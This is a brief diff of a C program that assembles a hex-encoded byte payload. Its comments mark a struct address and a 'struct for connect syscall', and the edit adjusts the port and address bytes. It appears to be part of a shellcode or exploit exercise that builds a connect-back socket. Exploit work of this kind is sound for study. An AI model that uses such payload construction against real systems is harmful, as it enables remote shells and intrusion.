@@ -62,9 +62,9 @@ int main(void)
                       "\x88\x29\xbf\xbf" // addy of x struct
                       "\xaa\xaa\xaa\xaa" // four-byte value 16
                       ""
-                      "\xaa"
-                      "\x02"
-                      "\x39\x30"
+                      // "\xaa"
+                      // "\x02"
+                      "\x39\x30\x02\xaa"
                       "\x01\xAA\xAA\x7f"
                       "\x01\x01\x01\x01\x01\x01\x01\x01" // struct for connect syscall
                       );
